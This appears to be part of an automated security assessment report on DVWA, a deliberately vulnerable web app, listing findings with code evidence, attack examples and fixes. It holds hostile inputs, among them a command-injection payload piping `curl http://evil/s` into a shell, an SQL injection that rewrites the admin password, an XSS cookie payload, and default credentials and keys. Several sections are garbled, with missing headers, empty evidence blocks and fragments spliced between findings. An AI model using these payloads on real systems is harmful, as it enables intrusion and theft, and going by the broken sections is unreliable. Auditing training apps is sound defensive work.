<a id="w-018"></a>
### W-018 — Build pipeline trusts mutable third-party references

🟡 Medium · design weakness · design-risk · 1 finding

CI/CD workflows resolve third-party actions and other build dependencies to mutable tags or branches instead of immutable commit digests, so a retagged or compromised upstream runs inside the pipeline with its token and secret scope.

**Practice sites:**

- 🟡 [F-056](#f-056) — Third-party GitHub Actions pinned to mutable tags instead of commit SHAs
- `.github/workflows/pytest.yml:26`

**Architecture evidence:** Commit-SHA Action Pinning, Dependency Provenance Verification, Source evidence (`.github/workflows/shiftleft-analysis.yml:24`), Source evidence (`.github/workflows/docker-image.yml:16`), Source evidence (`.github/workflows/docker-image.yml:19`), Source evidence (`.github/workflows/docker-image.yml:22`)

**Affected components:** [C-02](#c-02)

**Remediation:**

- **Structural** — pin every third-party action and build dependency to an immutable commit SHA (or a vetted internal mirror) and enforce SHA-pinning in CI
- **Tactical** — ◑ [M-060](#m-060) — Pin third-party dependencies to immutable versions

<a id="th-01"></a><a id="th-02"></a><a id="th-03"></a><a id="th-05"></a><a id="th-06"></a><a id="th-07"></a><a id="th-09"></a><a id="th-11"></a><a id="th-15"></a><a id="th-16"></a><a id="th-12"></a><a id="th-14"></a><a id="th-17"></a><a id="th-18"></a>

### 🔴 Critical (2)

<a id="t-004"></a><a id="f-004"></a>
#### F-004 · OS command injection in health connectivity check and ping feature

**Severity:** 🔴 Critical  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** Multiple locations (7)

**Found by:** survey, scanners and verification ([TC-INPUT-03](#tc-input-03))

**Reliability:** High. Probably real: a model review confirmed it, and the survey and verification each found it.

**Weakness:** [W-001](#w-001) - Application data builds operating-system commands

**Instances (7):** `vulnerabilities/api/src/HealthController.php`: 88; `vulnerabilities/exec/source/low.php`: 14, 10; `vulnerabilities/exec/source/medium.php`: 23, 19; `vulnerabilities/exec/source/high.php`: 30, 26

**Issue:** Request data reaches shell commands, which gives the attacker arbitrary command execution as the web server user. At `vulnerabilities/api/src/HealthController.php:88`, an unauthenticated attacker POSTs JSON such as `{"target":"127.0.0.1;id"}` or `{"target":"x; curl http://evil/s|sh"}` to `/vulnerabilities/api/v2/health/connectivity`.

The API front controller routes health commands without authentication, and the target value is concatenated unvalidated and unescaped into an `exec()` ping command. The finding holds 7 places, more than the locations cited here.

**Evidence:** ✓ verified

```
vulnerabilities/api/src/HealthController.php
  85 │ 		if (array_key_exists ("target", $input)) {
  86 │ 			$target = $input['target'];
  87 │
→ 88 │ 			exec ("ping -c 4 " . $target, $output, $ret_var);
  89 │
  90 │ 			if ($ret_var == 0) {
  91 │ 				$response['status_code_header'] = 'HTTP/1.1 200 OK';
```

**Fix:** Replace shell invocations with an argv-list API and validate every input → ● [M-013](#m-013) — Validate target host and use escapeshellarg

**Classification:** Injection · STRIDE: Tampering · [CWE-78](https://cwe.mitre.org/data/definitions/78.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · Verification items: [TC-INPUT-03](#tc-input-03) · Rules: INJ-PHP-002 · walkthrough [Walkthrough §3.1](#31-os-command-injection-in-health-connectivity-check-and-ping-feature)

<a id="t-005"></a><a id="f-005"></a>
#### F-005 · SQL injection in user detail update endpoint

**Severity:** 🔴 Critical  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/authbypass/change_user_details.php:47`

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-002](#w-002) - Database access relies on concatenated queries

**Trust boundary gap:** [tb-2](#tb-2) - DVWA Web Application → MariaDB Database · Query construction: Request JSON fields become SQL text sent to MariaDB, which breaks the data-interpretation assumption of this boundary.

**Issue:** An attacker sets the cookie `security=low` and POSTs JSON `{"id":"1","first_name":"x', password=md5('pw') -- ","surname":"y"}` to `change_user_details.php`. The concatenated UPDATE runs the injected SQL and rewrites the admin password.

**Evidence:** ✓ verified

```
  44 │ 	exit;
  45 │ }
  46 │
→ 47 │ $query = "UPDATE users SET first_name = '" . $data->first_name . "', last_name = '" .  $data->surname . "' where user_id = " . $data->id . "";
  48 │ $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
  49 │
  50 │ print json_encode (array ("result" => "ok"));
```

**Fix:** Switch all SQL execution to parameterised queries or ORM-bound parameters → ● [M-014](#m-014) — Use prepared statements for user update query

**Classification:** Injection · STRIDE: Tampering · [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · walkthrough [Walkthrough §3.2](#32-sql-injection-in-user-detail-update-endpoint)

### 🟠 High (34)

<a id="t-027"></a><a id="f-027"></a>
#### F-027 · Hardcoded MariaDB root and application passwords in compose

**Severity:** 🟠 High  ·  **Component:** [C-02](#c-02) - CI/CD Pipeline  ·  **Location:** `compose.yml:31`

**Found by:** survey, scanners and verification ([TC-DATA-03](#tc-data-03))

**Reliability:** High. Probably real: a model review confirmed it, and the survey and verification each found it.

**Weakness:** [W-007](#w-007) - Secrets are committed to source instead of a managed store

**Issue:** At `compose.yml:31` the service environment holds literal credentials: `MYSQL_ROOT_PASSWORD`=dvwa and the application database password. Anyone with repository access or a copy of the compose file can read them, and every deployment that uses the file runs with the same credentials.

That attacker can then take full control of MariaDB and read or change all application data.

**Evidence:** ✓ verified

```yaml
  29 │     image: docker.io/library/mariadb:10
  30 │     environment:
→ 31 │       - MYSQL_ROOT_PASSWORD=dvwa
  32 │       - MYSQL_DATABASE=dvwa
  33 │       - MYSQL_USER=dvwa
```

**Fix:** Move the credential out of source control into a secret store and rotate it → ◕ [M-007](#m-007) — docker-compose secrets supplied by reference

**Classification:** Cryptographic Failures · STRIDE: Information Disclosure · [CWE-798](https://cwe.mitre.org/data/definitions/798.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/) · Verification items: [TC-DATA-03](#tc-data-03) · Rules: IAC-023

<a id="t-029"></a><a id="f-029"></a>
#### F-029 · Hardcoded symmetric encryption keys in source

**Severity:** 🟠 High - secret committed to the public source repo - extractable on clone, no prior access needed; elevated to Critical as a verified attack-chain keystone in AC-T-005 (Authentication Bypass via Exposed Secret Material); see [§9](#9-abuse-cases)  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** Multiple locations (2)

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-007](#w-007) - Secrets are committed to source instead of a managed store

**Instances (2):** `vulnerabilities/cryptography/source/token_library_impossible.php`: 3; `vulnerabilities/cryptography/source/token_library_high.php`: 3

**Issue:** Anyone who reads the source, which DVWA exposes through `view_source`, learns the keys: 'rainbowclimbinghigh' is shared by the CBC and GCM token libraries, and the ECB and XOR keys are also embedded. With these keys an attacker can decrypt or mint tokens.

**Evidence:** ✓ verified - A signing key is embedded as a literal constant in source.

**Fix:** Move the cryptographic key out of source control into a managed secret store and rotate it → ● [M-035](#m-035) — Load keys from a secret store

**Classification:** Cryptographic Failures · STRIDE: Information Disclosure · [CWE-321](https://cwe.mitre.org/data/definitions/321.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/) · walkthrough [Walkthrough §3.3](#33-hardcoded-symmetric-encryption-keys-in-source)

<a id="t-002"></a><a id="f-002"></a>
#### F-002 · Broken MD5 hashing used for stored passwords without salt or strength policy

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** Multiple locations (5)

**Found by:** scanners and verification ([TC-AUTHN-04](#tc-authn-04))

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-008](#w-008) - Security-sensitive data uses weak cryptographic primitives

**Instances (5):** `dvwa/includes/dvwaPage.inc.php`: 651; `vulnerabilities/captcha/source/impossible.php`: 14; `vulnerabilities/csrf/test_credentials.php`: 19; `vulnerabilities/javascript/index.php`: 43; `vulnerabilities/javascript/source/low.php`: 18

**Issue:** Uses a broken hash primitive (`MD5`/SHA-1). These algorithms are collision-broken and unsafe for passwords or for the integrity of untrusted data. The finding holds 5 places, more than the locations cited here.

**Evidence:** ✓ verified

```
dvwa/includes/dvwaPage.inc.php
  649 │ 		destroySessionToken();
  650 │ 	}
→ 651 │ 	$_SESSION[ 'session_token' ] = md5( uniqid() );
  652 │ }
  653 │
```

**Fix:** Replace the broken hash with a salted password-hashing function (bcrypt/Argon2id) → ◕ [M-011](#m-011) — Use modern cryptographic hash and KDF algorithms

**Classification:** Cryptographic Failures · STRIDE: Information Disclosure · [CWE-328](https://cwe.mitre.org/data/definitions/328.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/) · Verification items: [TC-AUTHN-04](#tc-authn-04), [TC-CRYPTO-01](#tc-crypto-01) · Rules: CRYPTO-PHP-001

<a id="t-006"></a><a id="f-006"></a>
#### F-006 · Password change does not require the current password

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/csrf/source/low.php:9`

**Found by:** verification ([TC-AUTHN-05](#tc-authn-05))

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-009](#w-009) - Password change does not require the current password (`low.php:9`)

**Issue:** An attacker with a victim's session, or one who can trigger a GET request through the victim's browser, calls the password change with matching new and confirm values. The victim's password is replaced without the current password, which lets the attacker take over the account.

**Evidence:** ✓ verified - The handler reads `password_new` and `password_conf` from \$_GET (line 5), checks only that they are equal (line 9), and updates `users.password` (line 16).

```
   7 │
   8 │ 	// Do the passwords match?
→  9 │ 	if( $pass_new == $pass_conf ) {
  10 │ 		// They do!
  11 │ 		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
```

**Fix:** ◕ [M-015](#m-015) — Verify the current password before any password change

**Classification:** Broken Authentication · STRIDE: Spoofing · [CWE-620](https://cwe.mitre.org/data/definitions/620.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/) · Verification items: [TC-AUTHN-05](#tc-authn-05)

<a id="t-007"></a><a id="f-007"></a>
#### F-007 · Unauthenticated CBC token exposes padding oracle

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/cryptography/source/token_library_high.php:26`

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Issue:** The token is AES-128-CBC with no MAC, and `check_token` returns status 526 on decryption failure but other statuses otherwise. Through the unauthenticated `check_token_high.php` endpoint, a client can use this oracle to alter the userid in a token and be resolved as the admin user.

**Evidence:** ✓ verified

```
  24 │ 		throw new Exception ("IV must be 16 bytes, " . strlen ($iv) . " passed");
  25 │ 	}
→ 26 │ 	$e = openssl_decrypt($ciphertext, ALGO, KEY, OPENSSL_RAW_DATA, $iv);
  27 │ 	if ($e === false) {
  28 │ 		throw new Exception ("Decryption failed");
```

**Fix:** ◕ [M-016](#m-016) — Use authenticated encryption with uniform errors

**Classification:** Cryptographic Failures · STRIDE: Spoofing · [CWE-649](https://cwe.mitre.org/data/definitions/649.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)

<a id="t-008"></a><a id="f-008"></a>

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Issue:** Setup seeds admin/password and other dictionary passwords, and `setup.php` advertises admin // password; an attacker reaching `login.php` logs in as admin with them.

**Evidence:** ✓ verified

```
  53 │
  54 │ $insert = "INSERT INTO users VALUES
→ 55 │ 	('1','admin','admin','admin',MD5('password'),'{$avatarUrl}admin.jpg', NOW(), '0'),
  56 │ 	('2','Gordon','Brown','gordonb',MD5('abc123'),'{$avatarUrl}gordonb.jpg', NOW(), '0'),
  57 │ 	('3','Hack','Me','1337',MD5('charley'),'{$avatarUrl}1337.jpg', NOW(), '0'),
```

**Classification:** Broken Authentication · STRIDE: Spoofing · [CWE-1392](https://cwe.mitre.org/data/definitions/1392.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/)

<a id="t-009"></a><a id="f-009"></a>
#### F-009 · Setup seeds accounts with well-known weak default passwords

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `dvwa/includes/DBMS/MySQL.php:55`

**Found by:** verification ([TC-AUTHN-04](#tc-authn-04))

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Issue:** Running setup creates admin and other users with passwords such as 'password', 'abc123' and 'letmein'. An attacker who reaches the login form signs in as admin with admin/password.

**Evidence:** ✓ verified - The `INSERT INTO users` statement seeds admin with `MD5('password')` and smithy with `MD5('password')`. The PGSQL setup does the same.

```
  53 │
  54 │ $insert = "INSERT INTO users VALUES
→ 55 │ 	('1','admin','admin','admin',MD5('password'),'{$avatarUrl}admin.jpg', NOW(), '0'),
  56 │ 	('2','Gordon','Brown','gordonb',MD5('abc123'),'{$avatarUrl}gordonb.jpg', NOW(), '0'),
  57 │ 	('3','Hack','Me','1337',MD5('charley'),'{$avatarUrl}1337.jpg', NOW(), '0'),
```

**Fix:** ◕ [M-018](#m-018) — Remove default passwords and force setting on first use

**Classification:** Broken Authentication · STRIDE: Spoofing · [CWE-1393](https://cwe.mitre.org/data/definitions/1393.html) · [OWASP A07:2025](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/) · Verification items: [TC-AUTHN-04](#tc-authn-04)

<a id="t-016"></a><a id="f-016"></a>
#### F-016 · SQL injection

**Severity:** 🟠 High - elevated to Critical by the always-critical rule for CWE-89  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/bac/source/low.php:81`

**Weakness:** [W-002](#w-002) - Database access relies on concatenated queries

**Issue:** An attacker sends a crafted X-Forwarded-For header. It is interpolated unescaped into the `bac_log` INSERT, which allows injected SQL such as subquery-based exfiltration into log rows or time-based blind injection.

**Evidence:** ✓ verified

```

  83 │             // Silently fail if logging doesn't work
```

**Fix:** Switch all SQL execution to parameterised queries or ORM-bound parameters → ● [M-023](#m-023) — Bind log values with prepared statements

**Classification:** Injection · STRIDE: Tampering · [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/)

```

  10 │ 			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
→ 11 │ 			$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
  12 │
  13 │ 			// Get results
```

**Fix:** Switch all SQL execution to parameterised queries or ORM-bound parameters → ● [M-025](#m-025) — Bind session id via prepared statement

**Classification:** Injection · STRIDE: Tampering · [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · walkthrough [Walkthrough §3.5](#35-second-order-sql-injection-in-high)

<a id="t-019"></a><a id="f-019"></a>
#### F-019 · SQL injection

**Severity:** 🟠 High - elevated to Critical by the always-critical rule for CWE-89  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/sqli/source/low.php:11`

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-002](#w-002) - Database access relies on concatenated queries

**Trust boundary gap:** [tb-2](#tb-2) - DVWA Web Application → MariaDB Database · Query construction: Request-derived id becomes SQL text sent to MariaDB, which breaks the data-interpretation assumption.

**Issue:** An authenticated user supplies an id value that breaks out of the quoted literal. Because it is concatenated into the SELECT, the user can read other tables such as user password hashes.

**Evidence:** ✓ verified

```
   9 │ 			// Check database
  10 │ 			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
→ 11 │ 			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
  12 │
  13 │ 			// Get results
```

**Fix:** Switch all SQL execution to parameterised queries or ORM-bound parameters → ● [M-026](#m-026) — Use prepared statements with bound integer id

**Classification:** Injection · STRIDE: Tampering · [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · walkthrough [Walkthrough §3.6](#36-sql-injection-in-low)

<a id="t-020"></a><a id="f-020"></a>
#### F-020 · SQL injection in unquoted numeric context despite escaping

**Severity:** 🟠 High - elevated to Critical by the always-critical rule for CWE-89  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/sqli/source/medium.php:12`

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-002](#w-002) - Database access relies on concatenated queries

**Issue:** An authenticated user tampers with the POST id. The value is escaped but placed unquoted in the WHERE clause, so SQL syntax without quotes alters the query and reads other data.

**Evidence:** ✓ verified

```
  10 │ 		case MYSQL:
  11 │ 			$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
→ 12 │ 			$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
  13 │
  14 │ 			// Get results
```

**Fix:** Switch all SQL execution to parameterised queries or ORM-bound parameters → ● [M-027](#m-027) — Bind id as integer parameter in prepared query

**Classification:** Injection · STRIDE: Tampering · [CWE-89](https://cwe.mitre.org/data/definitions/89.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · walkthrough [Walkthrough §3.7](#37-sql-injection-in-unquoted-numeric-context-despite-escaping)

<a id="t-030"></a><a id="f-030"></a>
#### F-030 · Unsalted MD5 password hashing

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** Multiple locations (2)

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-008](#w-008) - Security-sensitive data uses weak cryptographic primitives

**Instances (2):** `login.php`: 27; `vulnerabilities/brute/source/low.php`: 9

**Issue:** An attacker who obtains the users table, for example through the SQL injection, cracks the unsalted `MD5` password hashes with rainbow tables almost instantly.

**Evidence:** ✓ verified - A non-iterating hash is used for password storage.

**Fix:** Replace the broken hash with a salted password-hashing function (bcrypt/Argon2id) → ◕ [M-036](#m-036) — Hash passwords with a strong, salted algorithm

**Classification:** Cryptographic Failures · STRIDE: Information Disclosure · [CWE-916](https://cwe.mitre.org/data/definitions/916.html) · [OWASP A04:2025](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/)

<a id="t-032"></a><a id="f-032"></a>
#### F-032 · Unvalidated page parameter passed to PHP include

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/fi/index.php:36`

**Found by:** survey and verification ([TC-FILE-01](#tc-file-01))

**Reliability:** High. Probably real: a model review confirmed it, and the survey and verification each found it.

**Issue:** At the low security level, `low.php` assigns `$_GET['page']` to \$file, and `vulnerabilities/fi/index.php:36` passes it unchecked to `include()`. The only control is authentication through `dvwaPageStartup`.

If the attacker injects PHP into a log file the server can read and then includes that file, the code runs as the web server user.

**Evidence:** ✓ verified - `low.php` line 4 sets \$file = `$_GET['page']` with no check. `index.php` line 36 then calls `include($file)`. Only `impossible.php` applies an allowlist (lines 7-18).

```
  34 │ // if( count( $_GET ) )
  35 │ if( isset( $file ) )
→ 36 │ 	include( $file );
  37 │ else {
  38 │ 	header( 'Location:?page=include.php' );
```

**Fix:** ◕ [M-037](#m-037) — Restrict included files to a fixed allowlist

**Classification:** Code Execution via Unsafe Deserialization or Eval · STRIDE: Elevation of Privilege · [CWE-98](https://cwe.mitre.org/data/definitions/98.html) · [OWASP A08:2025](https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/) · Verification items: [TC-FILE-01](#tc-file-01)

<a id="t-033"></a><a id="f-033"></a>

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Issue:** The high level accepts any value matching `fnmatch('file*')`. This includes stream-wrapper paths that begin with 'file', so arbitrary local files reach `include()`.

**Evidence:** ✓ verified

```

  6 │ // Input validation
→ 7 │ if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
  8 │ 	// This isn't the page we want!
  9 │ 	echo "ERROR: File not found!";
```

**Fix:** ◕ [M-038](#m-038) — Allowlist exact include filenames

**Classification:** Insecure File Handling · STRIDE: Elevation of Privilege · [CWE-98](https://cwe.mitre.org/data/definitions/98.html) · [OWASP A06:2025](https://owasp.org/Top10/2025/A06_2025-Insecure_Design/)

```
→  8 │ $file = str_replace( array( "../", "..\\" ), "", $file );
   9 │
  10 │ ?>
```

<a id="t-035"></a><a id="f-035"></a>
#### F-035 · Unrestricted file upload stores any file under its client name

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/upload/source/low.php:9`

**Found by:** survey and verification ([TC-FILE-02](#tc-file-02))

**Reliability:** High. Probably real: a model review confirmed it, and the survey and verification each found it.

**Issue:** At `vulnerabilities/upload/source/low.php:9` the low security level moves an authenticated user's uploaded file into hackable/uploads/ under its original client-supplied name and extension. It checks no type, extension, content or size.

If PHP runs in the uploads directory, requesting that path makes the web server execute the attacker's code.

**Evidence:** ✓ verified

```

   8 │ 	// Can we move the file to the upload folder?
→  9 │ 	if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {

  11 │ 		$html .= '<pre>Your image was not uploaded.</pre>';
```

**Fix:** Validate uploaded file type, size, and storage path; never execute uploaded content → ◕ [M-039](#m-039) — Allowlist image types and randomize stored names

An authenticated attacker intercepts the upload and sets the `Content-Type` of `shell.php` to image/jpeg.

If that directory runs PHP, the attacker requests the file to run it.


**Fix:** Validate uploaded file type, size, and storage path; never execute uploaded content → ◕ [M-040](#m-040) — Validate extension and content server-side

#### F-038 · CBC padding oracle on token check endpoint

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/cryptography/source/token_library_high.php:126`

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Issue:** An attacker submits modified IV and ciphertext values to `check_token_high.php`. Status 526 (decryption failed) and the other statuses distinguish bad padding from valid padding, so the attacker can decrypt the token and forge userid:1 to become admin. The CBC token has no MAC.

**Evidence:** ✓ verified

```
  127 │ 							"extra" => $exp->getMessage()

```

**Fix:** ◕ [M-042](#m-042) — Switch token to AEAD with uniform errors

<a id="t-001"></a><a id="f-001"></a>
#### F-001 · Missing Anti-CSRF Token on State Changes

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** Multiple locations (3)

**Reliability:** Medium. A model review confirmed it, but the survey and verification did not both find it.

**Weakness:** [W-005](#w-005) - Cookie-authenticated changes lack request authenticity checks

**Instances (3):** `vulnerabilities/captcha/source/low.php`: 45; `vulnerabilities/csrf/source/low.php`: 3; `vulnerabilities/xss_s/index.php`: 16

**Issue:** A malicious page auto-submits a POST of `step=2` with a chosen password to the CAPTCHA page. If the browser sends the session cookie, the victim's password is changed. No CSRF token or current-password check is enforced, and `high.php` never calls `checkToken`.

**Evidence:** ✓ verified - A state-changing request can be triggered cross-origin without a synchroniser token.

**Fix:** Enforce a same-origin or signed CSRF token on every state-changing endpoint → ◕ [M-010](#m-010) — Require CSRF token and current password

**Classification:** Cross-Site Request Forgery (CSRF) · STRIDE: Tampering · [CWE-352](https://cwe.mitre.org/data/definitions/352.html) · [OWASP A01:2025](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)

<a id="t-011"></a><a id="f-011"></a>
#### F-011 · Stored XSS

**Severity:** 🟠 High  ·  **Component:** [C-03](#c-03) - DVWA Web Application  ·  **Location:** `vulnerabilities/authbypass/authbypass.js:45`

**Found by:** survey and verification ([TC-INPUT-04](#tc-input-04))

**Reliability:** High. Probably real: a model review confirmed it, and the survey and verification each found it.

**Weakness:** [W-006](#w-006) - Frontend rendering lacks enforced output encoding

**Issue:** An attacker stores a `first_name` or surname such as ">&lt;img `src=x` `onerror=alert`(`document.cookie`)&gt; through `change_user_details.php`. One part describes this attacker as unauthenticated, and the other describes the attacker only as a user.

When the admin opens the authbypass page, the script runs in the admin's session.

**Evidence:** ✓ verified

```javascript
  43 │ 			cell0.innerHTML = user['user_id'] + '<input type="hidden" id="user_id_' + user['user_id'] + '" name="user_id" value="' + user['user_id'] + '" />';
  44 │ 			var cell1 = row.insertCell(1);
→ 45 │ 			cell1.innerHTML = '<input type="text" id="first_name_' + user['user_id'] + '" name="first_name" value="' + user['first_name'] + '" />';
  46 │ 			var cell2 = row.insertCell(2);
  47 │ 			cell2.innerHTML = '<input type="text" id="surname_' + user['user_id'] + '" name="surname" value="' + user['surname'] + '" />';
```

**Fix:** Output-encode untrusted strings at every sink and remove all `bypassSecurityTrustHtml` calls → ◕ [M-019](#m-019) — Render user fields via textContent and DOM APIs

**Classification:** Cross-Site Scripting (XSS) · STRIDE: Tampering · [CWE-79](https://cwe.mitre.org/data/definitions/79.html) · [OWASP A05:2025](https://owasp.org/Top10/2025/A05_2025-Injection/) · Verification items: [TC-INPUT-04](#tc-input-04)
